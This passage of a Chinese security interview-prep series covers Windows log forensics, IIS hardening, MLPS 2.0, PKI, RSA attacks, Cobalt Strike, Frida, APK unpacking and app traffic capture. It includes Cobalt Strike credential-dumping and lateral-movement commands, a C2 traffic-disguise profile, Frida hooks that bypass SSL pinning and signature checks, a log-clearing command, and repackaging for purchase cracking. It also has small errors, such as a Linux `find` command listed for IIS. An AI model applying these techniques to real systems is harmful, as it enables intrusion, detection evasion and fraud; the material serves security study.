- sp_oacreate 替代执行
- CLR Assembly 加载 DLL
- MSSQL 到域控提权链路

---


---

### 第 71 天（精讲） ★★★★ Windows 日志分析与关键事件 ID


**主题**：应急响应与取证 / 日志分析

**答案**：

Windows 事件查看器（eventvwr.msc）三类关键日志：

**1. 安全日志（Security）**：
- **4624**：登录成功（重点：管理员登录时间/IP）
  - 字段：Logon Type（2=交互、3=网络、4=批处理、5=服务、10=RDP、9=NewCred）
- **4625**：登录失败（爆破检测：高频 4625 + 最终 4624 = 爆破成功）
- **4648**：显式凭据登录（Pass-the-Hash 特征）
- **4672**：特权登录（管理员登录）
- **4720**：创建用户（攻击者添加账号）
- **4732**：添加用户到组（提权到管理员）
- **4738**：用户账号变更
- **4740**：用户账号锁定

**2. 系统日志（System）**：
- **7045**：服务安装（PsExec、恶意服务）
- **7034/7035**：服务异常停止/启动
- **6005**：事件日志服务启动（开机时间）
- **6006**：事件日志服务停止（关机时间）
- **6008**：上次关机异常（强关机/断电）
- **1001**：BugCheck（蓝屏 dump）

**3. 应用日志（Application）**：
- 应用程序异常
- 第三方软件日志

**PowerShell 日志（事件 ID 4104）**：
- ScriptBlockLogging：捕获执行的 PowerShell 脚本内容
- 攻击者常用 PowerShell 执行恶意操作
- **4103**：模块日志
- **4104**：脚本块日志

**Sysmon 日志（增强监控）**：
- 进程创建（EventID 1）：ImagePath / CommandLine / Hash
- 网络连接（EventID 3）：进程 + 目的 IP/端口
- 文件创建（EventID 11）：Sysmon 驱动记录
- 镜像加载（EventID 7）：DLL 加载监控
- 注册表修改（EventID 13）：持久化检测

**日志存储**：
- 默认位置：`C:\Windows\System32\winevt\Logs\*.evtx`
- 备份策略：异地集中存储（WEF / EventLog Forwarding）
- 攻击者清理：`wevtutil cl Security`（清空日志）

**分析工具**：
- Windows 自带 eventvwr.msc
- LogParser（SQL 查询日志）
- Chainsaw / EvtxECmd / Windows-event-log-parser
- Elastic Stack（ELK）+ Winlogbeat
- Splunk

**排查技巧**：
1. 按时间线定位攻击窗口
2. 按用户名筛选可疑账户
3. 按 Logon Type=10/3 排查网络/RDP 登录
4. 4625+4624 时间相邻 = 爆破成功

**解析**：

考察意图：Windows 取证核心技能。回答要点：要列出关键 EventID + 对应场景。易错点：只提 4624 忽视其他。面试官想听到：能详细解释 Logon Type 字段（2 交互/3 网络/10 RDP），4625→4624 相邻=爆破成功的特征，以及 Sysmon 在高级威胁检测中的作用（蓝队必备工具）。

**考察知识点**：

- 4624 / 4625 / 4720 / 7045 关键 ID
- Logon Type 字段含义
- PowerShell 4104 脚本日志
- Sysmon 增强监控

---


---

### 第 72 天（精讲） ★★★ IIS 服务器安全保护措施


**主题**：主机安全与基线 / IIS 加固

**答案**：

IIS（Internet Information Services）是 Windows 的 Web 服务器，加固要点：

1. 保持系统更新：Windows Update 自动更新，关注 IIS 相关补丁
2. IIS 防范工具：Microsoft Baseline Security Analyzer、URLScan 过滤恶意请求
3. 移除缺省站点：删除默认 Web 站点（占用 80 端口）
4. 卸载不需要的服务：FTP / SMTP / NNTP（除非需要）
5. 严格控制写权限：Web 目录禁止写权限，上传目录单独配置
6. 设置复杂密码：管理员/数据库/应用账号均强密码
7. 减少/排除 Web 服务器共享：移除默认共享，限制文件共享
8. 禁用 NetBIOS：减少攻击面
9. TCP 端口阻塞：防火墙仅开放 80/443
10. 检查可执行文件：`find / -name "*.bat" -o -name "*.exe" | xargs ls -la` 每周搜索可疑 exe
11. IIS 目录安全：目录权限最小化，移除 Everyone 写权限，关闭目录浏览
12. 使用 NTFS 安全：替代 FAT32，权限粒度更细，EFS 加密
13. 管理用户账户：禁用 Guest，限制管理员组成员，重命名管理员
14. 审计 Web 服务器：启用 IIS 日志（默认 `%SystemDrive%\inetpub\logs\LogFiles`），W3C Extended 格式
15. HTTPS 配置：SSL/TLS 1.2+，强加密套件，HSTS 头
16. 禁用危险 HTTP 方法：WebDAV、OPTIONS / TRACE、PUT / DELETE
17. URLScan 配置：过滤 URL 中特殊字符，限制请求大小
18. 应用隔离：应用池隔离，不同应用不同账号
19. 文件解析配置：移除脚本映射（.asp / .aspx / .php 等不必要时）
20. 备份恢复：定期备份配置，灾难恢复演练

**解析**：

考察意图：Web 服务器运维安全。回答要点：要分多个维度。易错点：只提禁用服务忽视应用层加固。面试官想听到：能详细说明 URLScan 配置、NTFS 权限粒度控制、IIS 日志格式解析（默认日志路径 `%SystemDrive%\inetpub\logs\LogFiles`）、应用池隔离防横向影响。

**考察知识点**：

- URLScan 过滤恶意请求
- NTFS 权限粒度控制
- IIS 应用池隔离
- WebDAV / 危险 HTTP 方法禁用

---


---

### 第 73 天（精讲） ★★★★★ 等级保护 2.0 主要要求与流程


**主题**：安全运营与合规 / 等保 2.0

**答案**：

等级保护 2.0 是中国信息安全的基本国策，2019-12-01 实施：

**核心要求（"一个中心，三重防护"）**：
1. 安全通信网络
2. 安全区域边界
3. 安全计算环境
4. 安全管理中心

**五大保护对象扩展（区别于 1.0）**：
- 传统系统：基础信息网络、云计算
- 新增：移动互联网、物联网、工业控制系统、大数据

**等级划分**：
- 第一级（自主保护）：用户自主保护
- 第二级（指导保护）：审计保护
- 第三级（监督保护）：**最常见**，金融/政务/企业主流
- 第四级（强制保护）：重要行业（能源/交通/金融）
- 第五级（专控保护）：涉密系统

**定级要素**：
- 受侵害客体（公民/社会/国家）
- 侵害程度（一般/严重/特别严重）

**定级流程**：
1. 确定定级对象（独立系统/平台）
2. 自主定级（初步定级）
3. 专家评审（3 级及以上）
4. 主管部门审核
5. 公安机关备案审查

**备案流程**：
- 30 日内到地市级以上公安机关备案
- 提交：
  - 信息系统安全等级保护定级报告
  - 信息系统安全等级保护备案表
  - 安全等级保护建设方案

**测评流程**：
1. 建设整改（按等级要求建设）
2. 测评机构选择（具有资质）
3. 现场测评（差距分析）
4. 整改修复
5. 出具测评报告
6. 年度复测（三级每年一次）

**测评指标（按等级要求差异）**：
- 物理安全：机房选址、防火防盗、温湿度控制
- 网络安全：边界防护、访问控制、入侵防范
- 主机安全：身份鉴别、访问控制、安全审计
- 应用安全：身份鉴别、访问控制、通信完整性
- 数据安全：数据加密、备份恢复

**技术要求 vs 管理要求**：
- 技术：物理/网络/主机/应用/数据 5 个层面
- 管理：安全管理制度/机构/人员/建设/运维 5 个方面

**2.0 新增要求**：
1. 主动防御：态势感知、威胁情报、蜜罐
2. 动态感知：实时监测、关联分析
3. 集中管控：SOC/SIEM 集中管理
4. 密码应用要求：单独成册（2020 年实施）

**常见问题**：
- 云计算平台定级（云服务商/租户分别定级）
- 物联网扩展要求
- 移动互联扩展要求
- 工业控制扩展要求

**合规边界**：
- 不做等保：法律责任（《网络安全法》第 21 条）
- 罚款：1-10 万元
- 重大事故：直接责任人罚款 + 追究刑事责任

**合规等级与对应系统**：
- 二级：小型网站、内网 OA
- 三级：电商网站、政务门户、金融系统
- 四级：国家关键基础设施
- 五级：涉密

**解析**：

考察意图：合规是中国安全市场核心，几乎必问。回答要点：要讲清"一个中心三重防护"+定级流程。易错点：把 1.0 和 2.0 混淆。面试官想听到：能详细说明定级要素（受侵害客体+侵害程度）、三级系统的年度复测要求、2.0 新增的主动防御要求（蜜罐/态势感知）、密码应用单独要求（2020 年实施）。

**考察知识点**：

- 一个中心三重防护
- 三级系统每年测评
- 2.0 主动防御要求
- 云计算/移动互联扩展要求

---


---

### 第 74 天（精讲） ★★★ PKI 与 CA 数字证书体系


**主题**：加解密与编码 / PKI/CA

**答案**：

PKI（Public Key Infrastructure 公钥基础设施）是基于公钥密码学的安全体系：

**核心组件**：
1. CA（Certificate Authority）：证书颁发机构
2. RA（Registration Authority）：注册机构，审核申请
3. 证书存储：CRL / OCSP
4. KMC（Key Management Center）：密钥管理中心

**X.509 证书标准**：
```
Version: 3 (0x02)
Serial Number: ...
Signature Algorithm: sha256WithRSAEncryption
Issuer: CN=DigiCert Global Root CA
Validity:
  Not Before: Jan 1 00:00:00 2024 GMT
  Not After: Jan 1 23:59:59 2025 GMT
Subject: CN=example.com
Subject Public Key Info:
  Public Key Algorithm: rsaEncryption
  RSA Public Key: (2048 bit)
X509v3 extensions:
  X509v3 Subject Alternative Name:
    DNS:example.com, DNS:*.example.com
  X509v3 Key Usage:
    Digital Signature, Key Encipherment
  X509v3 Extended Key Usage:
    TLS Web Server Authentication, TLS Web Client Authentication
```

**证书类型**：
1. SSL/TLS 证书（服务器证书）：HTTPS
2. 客户端证书：身份认证
3. 代码签名证书：软件签名
4. 邮件证书：S/MIME
5. 中间证书：CA Chain

**证书链验证**：
- Root CA（自签名根证书）→ Intermediate CA → Leaf（域名证书）
- 浏览器验证：
  1. 检查证书是否由可信 CA 签发
  2. 检查证书链完整性
  3. 检查域名匹配（SAN）
  4. 检查有效期
  5. 检查撤销状态（OCSP / CRL）
  6. 检查证书用途（Key Usage）

**CSR（Certificate Signing Request）**：
1. 生成私钥：`openssl genrsa -out private.key 2048`
2. 生成 CSR：`openssl req -new -key private.key -out csr.pem`
3. 提交给 CA
4. CA 签发证书
5. 部署证书到 Web 服务器

**证书撤销**：
- CRL（Certificate Revocation List）：定期发布的撤销列表
- OCSP（Online Certificate Status Protocol）：实时查询
- OCSP Stapling：服务器定期获取 OCSP 响应缓存，提高性能

**数字证书应用**：
1. HTTPS：建立 TLS 连接
2. 邮件加密：S/MIME
3. VPN：IPSec 证书认证
4. 代码签名：软件供应链
5. 文档签名：PDF 签名
6. JWT Token：包含公钥信息

**攻击场景**：
1. 中间人攻击：伪造证书（需安装 CA）
2. 证书伪造：攻击 Root CA（如 DigiNotar 事件）
3. 证书过期：业务中断
4. 弱算法：SHA-1 / 1024 位 RSA
5. 误颁发证书：CA 失误

**Let's Encrypt 免费证书**：
- ACME 协议自动化
- 90 天有效期
- 自动续期

**部署建议**：
1. 使用 2048+ 位 RSA 或 ECC
2. 强制 TLS 1.2+
3. 禁用弱加密套件
4. 启用 HSTS
5. OCSP Stapling
6. 证书监控（过期告警）
7. 私钥保护（HSM / KMS）

**解析**：

考察意图：HTTPS 安全基础延伸。回答要点：要讲清证书链+验证流程。易错点：混淆 CRL 和 OCSP。面试官想听到：能详细说明证书链验证步骤（6 步检查）、CA 攻击历史案例（DigiNotar 荷兰 CA 被入侵导致伊朗 Gmail 用户被监控）、OCSP Stapling 原理（解决 OCSP 查询的性能+隐私问题）。

**考察知识点**：

- X.509 证书结构
- 证书链 Root → Intermediate → Leaf
- OCSP vs CRL
- TLS 证书部署最佳实践

---


---

### 第 75 天（精讲） ★★★★ RSA 算法原理与攻击场景


**主题**：加解密与编码 / RSA

**答案**：

**RSA 原理**：
- 数学基础：大整数分解难题（n = p*q，已知 n 难求 p 和 q）
- 密钥生成：
  1. 选两个大素数 p、q
  2. n = p*q
  3. φ(n) = (p-1)*(q-1)（欧拉函数）
  4. 选公钥指数 e（常用 65537），要求 gcd(e, φ(n))=1
  5. 求私钥 d：d*e ≡ 1 (mod φ(n))
- 公钥：(n, e)
- 私钥：(n, d)
- 加密：c = m^e mod n
- 解密：m = c^d mod n
- 数字签名：sig = m^d mod n（私钥签），verify = sig^e mod n（公钥验）

**安全要求**：
- n 长度 ≥ 2048 位（2024 标准），4096 位更安全
- e = 65537（标准）或 3（不安全，易攻击）
- p 和 q 应是强素数（差值大）
- 使用 OAEP 填充（防止选择密文攻击）

**常见攻击场景**：

**1. 低位数分解攻击**：
- n < 512 位：秒破
- 768 位：已成功分解
- 1024 位：理论上可分解但计算量大
- 2048 位：当前安全
- 工具：RSA Factoring Challenge

**2. 共模攻击（GCD）**：
- 多对密钥共用 n（n 相同，e 不同）
- 通过扩展欧几里得算法求明文
- 防御：每用户独立 n

**3. 小指数广播攻击（Hastad）**：
- 同一明文用不同 e 加密（e 较小）
- 中国剩余定理 CRT 求明文
- 防御：使用随机填充

**4. Bleichenbacher 攻击**：
- PKCS#1 v1.5 填充选择密文攻击
- 防御：使用 OAEP 填充

**5. Wiener 攻击（连分数）**：
- 私钥 d 较小时可恢复
- 防御：d 应足够大

**6. Padding Oracle 攻击**：
- 通过错误响应判断填充合法性
- 解密任意密文
- 防御：统一错误响应/使用 AEAD

**7. 心脏滴血（Heartbleed）**：
- OpenSSL CVE-2014-0160
- TLS 心跳扩展越界读取
- 泄露私钥、Cookie、密码
- 防御：升级 OpenSSL

**8. 量子计算威胁**：
- Shor 算法可在多项式时间分解大整数
- 后量子密码学：格密码/多变量/哈希签名
- NIST 已发布 PQC 标准

**代码审计要点**：
1. 密钥长度（>= 2048）
2. 随机数生成（SecureRandom 而非 Random）
3. 填充模式（OAEP 而非 PKCS1v1.5）
4. 避免硬编码私钥
5. 侧信道防护（恒定时间实现）

**解析**：

考察意图：密码学深度问题，面试加分项。回答要点：要讲清数学原理+常见攻击。易错点：不知道 e/d 关系或忽略填充攻击。面试官想听到：能详细解释模运算 m^e mod n 的加密原理、Bleichenbacher Padding Oracle 攻击原理（PKCS#1 v1.5 设计缺陷）、Wiener 攻击条件（d 较小）。

**考察知识点**：

- 大整数分解 n=p*q
- 共模 / 小指数 / 连分数攻击
- PKCS1v1.5 vs OAEP 填充
- 量子 Shor 算法威胁

---


---

### 第 76 天（精讲） ★★★ Cobalt Strike 使用与 CS 反制方法


**主题**：工具使用 / Cobalt Strike

**答案**：

Cobalt Strike（CS）是商业红队 C2（Command and Control）框架，3.7K$/年 license，护网红队标配。

**1. 架构**：
- TeamServer：服务端（控制端+监听），Linux/Windows
- Client：客户端 GUI（Java），可多个红队成员协作
- Beacon：植入目标机的代理（dll/exe/ps1/vba/macho）
- Profile：Malleable C2 配置文件（伪装流量）
- Aggressor Script：脚本引擎（JavaScript 变种）

**2. 部署**：
```bash
./teamserver <IP> <password> [/path/to/profile.profile]
./cobaltstrike        # 客户端启动
```

**3. 监听器（Listener）**：
- `windows/beacon_http` HTTP 上线
- `windows/beacon_https` HTTPS 加密
- `windows/beacon_dns` DNS 隧道
- `windows/beacon_smb` SMB 命名管道（内网横向）
- `windows/foreign` 外部监听（对接 MSF）
- DNS Beacon 慢但穿透强

**4. Beacon 类型**：
- HTTP/HTTPS Beacon：最常用
- DNS Beacon：隧道穿透，但慢
- SMB Beacon：内网横向（不出网）
- TCP Beacon：CS to CS

**5. 攻击功能**：
- Packages：
  - Windows Executable（exe）
  - Windows DLL
  - PowerShell Command
  - VBA Macro（钓鱼）
- 钓鱼攻击：邮件 + 附件 + Office 宏
- 投递：通过 CVE、钓鱼、Webshell
- 后渗透：
  - dump hash（mimikatz）
  - 横向移动（psexec/wmi/smb）
  - 令牌窃取（steal_token）
  - 进程注入（inject）
  - 屏幕截图 + socks 代理

**6. 核心命令**：
```
beacon> sleep 60       # 休眠时间（默认 60 秒）
beacon> shell whoami
beacon> hashdump
beacon> logonpasswords  # 调用 mimikatz
beacon> ps
beacon> inject <pid> <arch> <listener>   # 进程注入
beacon> spawn x64 <listener>             # 新建进程
beacon> psexec \\target powershell
beacon> jump psexec64 \\target smb       # 横向
beacon> socks 1080                       # 代理
beacon> rdesktop \\target                # 远程桌面
beacon> download/upload
beacon> exit
```

**7. Malleable C2（流量伪装）**：
```
http-get {
    set uri "/api/v1/status";
    client {
        header "Host" "cdn.cloudflare.com";
        header "Accept" "application/json";
    }
    server {
        header "Content-Type" "application/json";
    }
}
```
通过 Profile 将 C2 流量伪装为正常业务（如 CDN、API）。

**8. CS 反制（蓝队）**：
- 流量特征检测：默认 CS 证书（沃通）、心跳包周期、Jitter、AES 加密常数、URI 特征
- 工具识别：
  - BeaconEye：扫描 CS 证书
  - ThreatHunting：流量分析
  - C2Check：流量基线
- 反制 POC：CS 4.0 前有反序列化漏洞，蓝队可投递 Payload 给 CS TeamServer 反控
- CS 4.7+ 反反制：Sleep Mask 混淆内存、Artifact Kit 重编译
- 进程检查：beacon 默认调用 powershell、cmd 后留下日志

**9. 护网检测 CS 要点**：
- 检测 sleep+jitter 后的周期性流量
- TLS 证书 SHA1 指纹黑名单（CS 默认证书）
- DNS Beacon 特征（长随机子域名查询）
- 命令执行特征：mimikatz lsadump、sekurlsa
- 进程链：rundll32.exe 无参数 + 网络连接

**10. 替代品**：
- 开源：Empire、Sliver、Metasploit C2、Mythic
- 商业：Brute Ratel C4、Outflank C2、Nighthawk
- 国内：N1nj4Sec C2、Viper（CS 魔改）

**解析**：

考察意图：CS 是护网红队身份象征。回答要点：架构 + Beacon 类型 + 反制。易错点：只知攻击不知反制。面试官想听到：能讲清 Malleable C2 伪装原理、CS 4.0 反序列化漏洞反制、默认证书指纹（沃通 CA）、Beacon sleep/jitter 特征。

**考察知识点**：

- Beacon HTTP/HTTPS/DNS/SMB
- Malleable C2 流量伪装
- CS 反制：证书指纹 + 反序列化
- 护网 CS 检测特征

---


---

### 第 77 天（精讲） ★★★★ Frida 移动端 Hook 框架原理与使用


**主题**：移动安全 / Frida

**答案**：

Frida 是动态插桩工具，可 Hook 任何平台的函数（Android / iOS / Linux / Windows / macOS）：

**原理**：
- **Frida-Server**：注入到目标进程，作为服务端
- **Frida-Client**：Python / JS / C++ 脚本作为客户端
- 通过 TCP 通信，客户端脚本注入服务端
- 服务端通过 PTRACE / GumJS 引擎 Hook 目标进程

**安装**：

**1. Android 端**：
- 设备需 root
- 推送 frida-server 到 `/data/local/tmp/`
- chmod +x + 启动
- `adb shell su -c /data/local/tmp/frida-server`

**2. iOS 端**：
- 越狱设备 Cydia 安装 Frida
- 或使用 MonkeyDev / DynamicFrida

**常用命令**：
- `frida -U -l script.js package_name`：附加到应用
- `frida -U --codeshare pcipollak/universal-android-ssl-pinning-bypass-with-frida`：使用共享脚本
- `frida -H 192.168.1.100 -f com.app -l hook.js --no-pause`：远程 Hook
- `frida-server -l 0.0.0.0:6666`：监听所有 IP
- `frida-trace -i "open" -U com.app`：跟踪系统调用

**常用 Hook 脚本（绕过 SSL Pinning）**：
```javascript
Java.perform(function() {
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function() {
        console.log('SSL Pin bypassed');
        return;
    };
});
```

**关键应用场景**：
1. SSL Pinning 绕过（中间人抓包）
2. 加密参数 Hook（算法逆向）
3. Root 检测绕过
4. 反调试绕过
5. 协议分析（动态注册算法）
6. 凭证获取（获取内存中的 Key）

**优势**：
- 无需重打包
- 无需修改 APK 源码
- 实时动态 Hook
- 跨平台支持
- 丰富的脚本接口

**对比 Xposed**：

| 维度 | Frida | Xposed |
|------|-------|--------|
| 修改源码 | 否 | 否（需编译模块） |
| 重打包 | 否 | 否 |
| 性能影响 | 中 | 大 |
| 检测难度 | 中 | 易 |
| 安装要求 | push server | 安装 Xposed 框架 |

**逆向流程（Frida 辅助）**：
1. apktool 反编译查看 smali
2. jadx 查看 java 代码
3. 定位关键类/方法
4. Frida Hook 方法
5. 打印参数/返回值
6. 还原算法逻辑

**反调试绕过**：
- 绕过 ptrace 检测
- 绕过 TracerPID 检测
- 绕过 Frida 特征检测（hook 双向名）

**HW/红队应用**：
- 移动 APP 测试
- 支付协议分析
- 反编译 + 动态 Hook
- 内存取证

**解析**：

考察意图：移动安全必问工具。回答要点：要讲清 Frida 与 Xposed 差异 + SSL Pinning 绕过。易错点：忽视使用条件（root 设备）。面试官想听到：能详细解释 Frida-Server 与 Client 通信原理（GumJS 引擎）、SSL Pinning 绕过的具体 Hook 代码、反调试绕过（hook 双向名检测）。

**考察知识点**：

- Frida-Server 注入原理
- SSL Pinning Hook 绕过
- GumJS 脚本引擎
- Frida vs Xposed 对比

---


---

### 第 78 天（精讲） ★★★ Android APK 反编译与加固对抗方法


**主题**：移动安全 / Android 反编译

**答案**：

Android 逆向是移动安全核心，APK 本质是 ZIP + DEX + 资源，反编译工具链成熟。

**1. APK 结构**：
```
app.apk
├── AndroidManifest.xml  入口配置（二进制 AXML，需解码）
├── classes.dex          Dalvik 字节码
├── classes2.dex         多 dex（65535 方法上限）
├── lib/                 native so 库
├── assets/              资源
├── res/                 资源（layout/values/drawable）
├── META-INF/            签名信息
└── resources.arsc       资源索引
```

**2. 反编译工具链**：
- apktool：反编译资源（AndroidManifest.xml、layout、smali）
  `apktool d app.apk -o output`
- jadx：直接反编译 dex 为 Java 代码（首选）
  `jadx-gui app.apk`
- dex2jar + jd-gui / Bytecode Viewer：dex → jar → java
- baksmali / smali：dex ↔ smali 汇编
- Frida：动态 Hook（运行时分析）
- Xposed / Magisk：底层 Hook 框架
- JEB（商业）：最强反编译

**3. 静态分析步骤**：
1. jadx 打开 APK → 浏览包结构
2. AndroidManifest.xml → 入口 Activity、权限、组件 exported
3. 重点关注：
   - 硬编码密钥（API key、密钥、URL）
   - 加密算法（AES / DES / RSA 硬编码密钥）
   - 业务逻辑（支付、登录、签名校验）
   - WebView（JS 接口、allowFileAccess）
   - 组件暴露（exported=true → Intent 攻击）
   - SharedPreferences 明文存储

**4. 动态分析（Frida Hook）**：
```javascript
Java.perform(function() {
    var MainActivity = Java.use('com.app.MainActivity');
    MainActivity.checkSign.implementation = function(p1, p2) {
        console.log('checkSign called', p1, p2);
        return true;  // 绕过签名校验
    };
});
```

**5. 加固方案（厂商）**：
- 360 加固、腾讯乐固、梆梆、爱加密、阿里聚安全、百度加固
- 原理：
  - DEX 整体加密存储
  - 自定义 ClassLoader 动态加载
  - VMP（Virtual Machine Protection）核心代码转译
  - 字符串加密
  - 控制流混淆
- 加固后：jadx 看不到 Java 代码，只能看到壳

**6. 加固对抗（脱壳）**：
- 内存 Dump：运行时 dump dex（基于 frida-DEXDump、drizzleDumper）
  - Frida 脚本遍历 ClassLoader 内存
  - 找到 DexFile 对象 → 导出完整 dex
- Hook 点：
  - 360 加固：`Application.attachBaseContext`
  - 腾讯乐固：`com/tencent/StubShellActivity`
- 工具：
  - FRIDA-DEXDump（Xposed）
  - BlackDex
  - DumperX
  - FART（主动调用类）
- FART：基于 ART 主动调用所有类方法触发 dex 加载

**7. 双向认证（SSL Pinning）绕过**：
- Hook TrustManagerFactory
- Objection：`android sslpinning disable`
- Frida 脚本 hook X509TrustManager

**8. 重打包（Repackage）**：
- 反编译 → 修改 smali → 重签名 → 重打包
- 重签名工具：apksigner / uber-apk-signer
- 注意点：
  - 签名一致性校验（很多 App 会校验原签名）
  - 应用市场会拒绝重签名包
- 重打包用于：植入代码、绕过付费、广告去除、内购破解

**9. 法律风险**：
- 未经授权反编译可能违反《反不正当竞争法》《计算机软件保护条例》
- 仅用于授权测试和安全研究

**解析**：

考察意图：移动安全必考点。回答要点：工具链 + 加固对抗 + 动态分析。易错点：只会 jadx 不知脱壳。面试官想听到：能讲清加固原理（DEX 加密 + ClassLoader）、FRIDA-DEXDump 脱壳思路、SSL Pinning 绕过、签名校验对抗。

**考察知识点**：

- jadx / apktool 工具链
- 360 / 腾讯加固原理
- FRIDA-DEXDump 脱壳
- SSL Pinning 绕过

---


---

### 第 79 天（精讲） ★★★ App 抓包方法与 SSL Pinning 绕过


**主题**：移动安全 / App 抓包

**答案**：

App 抓包是移动安全基本功，目的：分析 HTTP/HTTPS 通信、定位 API 端点、检测数据加密方式。

**1. 基础抓包工具**：
- Charles（macOS/Windows，付费）
- Fiddler（Windows，HTTP/HTTPS）
- Burp Suite（专业首选）
- mitmproxy（Python 开源，支持脚本）
- Wireshark（TCP 层）

**2. HTTPS 抓包前置**：
1. 手机/模拟器安装 Burp / Charles 的 CA 证书
   - Burp：导出 der 证书 → 手机设置→安全→安装 CA
   - Android 7+：CA 证书默认不被 App 信任（networkSecurityConfig 限制）
   - 解决：把证书安装为系统证书（root 后推到 `/system/etc/security/cacerts/`）

2. 配置代理：
   - Wi-Fi 代理：手机 Wi-Fi 高级 → 手动代理 → 192.168.1.x:8080
   - 模拟器：`adb shell settings put global http_proxy 192.168.1.x:8080`

3. 抓包场景：无防护 App 直接看明文 / 有 SSL Pinning 需要绕过

**3. SSL Pinning 绕过方法**：

**A. 通用 Hook（Frida 脚本）**：
```javascript
Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    // 详细见 github.com/akabe1/frida-multiple-unpinning
});
```

**B. 主流框架（推荐）**：
1. Objection（最易用）：
   ```
   objection -g com.app.package explore
   android sslpinning disable
   android root disable
   ```
2. Frida 脚本库（github 搜索）：
   - akabe1/frida-multiple-unpinning
   - ele7enxxh/android-ssl-pinning-bypass
   - pcipolloni/universal-android-ssl-pinning-bypass

**C. 逆向修改**：
- 反编译 jadx → 找到网络请求类
- 修改证书校验逻辑为恒真
- 重打包重签名

**D. JustTrustMe（Xposed 模块）**：
- 安装到 Xposed
- 一键禁用所有 SSL Pinning

**E. 双向认证（客户端证书）**：
- App 会要求客户端也提供证书
- Hook 不到，必须从 APK 内提取 client.p12
- 文件位置：assets/、res/raw/、lib/、代码内置
- `openssl pkcs12 -in client.p12 -nocerts -nodes -out key.pem`
- Burp / Charles 导入 client 证书

**4. 高版本 Android 绕过**：
- Android 7+ 默认 App 不信任用户 CA
- Magisk + MagiskTrustUserCerts 模块 → 把用户 CA 升级为系统 CA
- 或修改 APK 的 `network_security_config.xml`
- 或修改 `targetSdkVersion < 24`（绕过限制）

**5. 实战案例**：
- 抓包某外卖 App 发现 API 接口明文返回位置
- 抓包某金融 App 定位加密字段（X-Sign、X-Timestamp）
- 抓包某社交 App 发现 WebSocket 上传位置
- 抓包某出行 App 绕过签名校验实现 0 元订单（需授权测试）

**6. 反抓包检测（App 视角）**：
- 检测代理：判断 getDefaultHost 是否为 null
- 检测 VPN
- 检测 Root / Xposed / Frida 特征
- 检测 Burp / Charles 证书（证书透明度 CT）
- 双向认证（mTLS）

**7. 绕过反抓包**：
- 关闭代理用 iptables 透明代理
- 隐藏 Frida 特征（使用 Gadget 隐藏模式）
- 修改检测逻辑（重打包）
- VPN 抓包（PCAPdroid）

**面试追问**：
- SSL Pinning vs 双向认证区别？答：Pinning 是校验服务器证书，mTLS 是双向证书校验
- Charles vs Burp 选哪个？答：Burp 更专业，Charles 更易用，护网用 Burp
- 如何抓包 WebView？答：WebView 如果使用系统代理可抓，否则需要 Hook `WebViewClient.shouldInterceptRequest`

**解析**：

考察意图：移动实操基础。回答要点：工具 + Burp 配置 + SSL Pinning 绕过。易错点：不知 Android 7+ 证书限制。面试官想听到：能讲清 MagiskTrustUserCerts 提升到系统证书、Frida 绕 Pinning 脚本库、Objection 一键绕过、双向认证 mTLS 处理。

**考察知识点**：

- Android 7+ 证书限制
- Objection / Frida 绕 Pinning
- Magisk 系统证书提升
- mTLS 双向认证

---


---

### 第 80 天（精讲） ★★★ 护网行动报告撰写要点与汇报技巧


**主题**：软技能与场景 / 护网报告

**答案**：

护网报告是衡量红蓝队价值的核心交付物，结构清晰、数据详实、证据完整是基本要求。

**1. 红队攻击报告结构**：

**A. 概述**：
- 演练时间、地点、参与单位
- 演练目标范围（系统清单）
- 演练方式（远程/现场）
- 整体评级（攻破深度）

**B. 战果清单**：
- 攻陷系统列表（IP + 系统类型 + 权限）
- 获取数据样本（截图脱敏）
- 攻击路径时序图
- 关键漏洞利用列表

**C. 攻击链复现**：
每条路径：
1. 入口（IP + 端口 + URL + 漏洞）
2. 利用步骤（截图 + POC 代码）
3. 权限提升路径
4. 横向移动记录
5. 最终目标达成

**D. 漏洞详情**：
- 漏洞名称 + 编号（CVE / CNVD）
- 危害等级（高危 / 严重）
- 影响范围
- POC 代码（脱敏）
- 修复建议

**E. 时间线**：
- Day1 X:XX 探测...
- Day2 X:XX 突破边界...
- Day3 X:XX 拿下核心系统...

**F. 改进建议**：
- 防护加固建议
- 监控规则建议
- 应急响应改进

**2. 蓝队防守报告结构**：

**A. 概述**：
- 防守时间、参与人员
- 系统资产清单
- 监控规则部署

**B. 战果统计**：
- 攻击事件数（按等级分类）
- 阻断次数
- 反制成功数
- 最终评分

**C. 攻击事件详情**：
- 时间戳
- 攻击 IP / 端口
- 攻击手法
- 检测告警
- 处置过程
- 攻击影响

**D. 反制记录**：
- 蜜罐捕获记录
- IP 画像
- 反渗透记录
- 法律取证

**E. 漏洞修复**：
- 已修复漏洞列表
- 加固项

**F. 经验总结**：
- 有效防护手段
- 失效监控规则
- 改进方向

**3. 报告写作要点**：

**A. 客观真实**：
- 不夸大也不掩盖
- 战果可复现
- 截图脱敏

**B. 数据驱动**：
- 量化指标：发现 X 条告警、阻断 Y 次
- 时间分布图
- 攻击趋势

**C. 证据完整**：
- 截图含时间戳
- 命令记录完整
- POC 可运行
- 审计日志支持

**D. 修复可行**：
- 每条漏洞配修复方案
- 优先级明确
- 责任分工

**4. PPT 汇报技巧**：

**A. 时间控制**：
- 红队汇报 15-30 分钟
- 蓝队汇报 15-30 分钟
- Q&A 10-15 分钟

**B. 开场结构**：
1. 一句话总结战果
2. 关键数据展示（图表）
3. 重磅案例分享（3-5 个）
4. 改进建议
5. 致谢

**C. 视觉化**：
- 攻击路径时序图
- 拓扑图标注
- 漏洞分布饼图
- 时间线甘特图

**D. 应对提问**：
- 准备 FAQ
- 不确定时说"会后核实"
- 不暴露客户敏感信息
- 不诋防守方

**5. 常见错误**：
- 报告全是文字没有图表
- 战果不附截图
- 漏洞只给 POC 不给修复
- 时间线混乱
- 拷贝通用模板
- 不脱敏敏感信息（违规）

**6. 实战模板**：
- 国护网总结模板（公安部网络安全保卫局）
- 各护网行动组织方提供模板
- 内部模板：公司积累

**7. 工具支持**：
- CherryTree / Obsidian（笔记）
- Draw.io / ProcessOn（流程图）
- 蚁剑/冰蝎流量截图
- 时间线：Excel + Plaso 输出

**面试追问**：
- 报告中最重要的是什么？答：可复现性 + 修复方案
- 蓝队报告反制部分怎么写？答：蜜罐截图 + IP 画像 + 反控记录
- 报告提交前如何审核？答：技术审核 + 法务审核（脱敏）+ 管理层审批

**解析**：
